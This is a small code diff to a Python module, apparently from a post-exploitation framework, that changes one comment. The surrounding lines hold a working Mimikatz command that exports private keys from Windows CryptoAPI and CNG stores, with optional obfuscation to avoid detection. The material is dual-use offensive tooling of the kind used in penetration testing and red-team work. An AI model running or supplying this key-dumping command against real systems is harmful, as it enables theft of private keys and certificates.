@@ -70,7 +70,7 @@ class Module:
 
         script = moduleCode
         
-        # add in the cert dumping command
+        # add in the key dumping command
         scriptEnd = """Invoke-Mimikatz -Command 'crypto::capi privilege::debug crypto::cng "crypto::keys /export"' """
         if obfuscate:
             scriptEnd = helpers.obfuscate(psScript=scriptEnd, obfuscationCommand=obfuscationCommand)
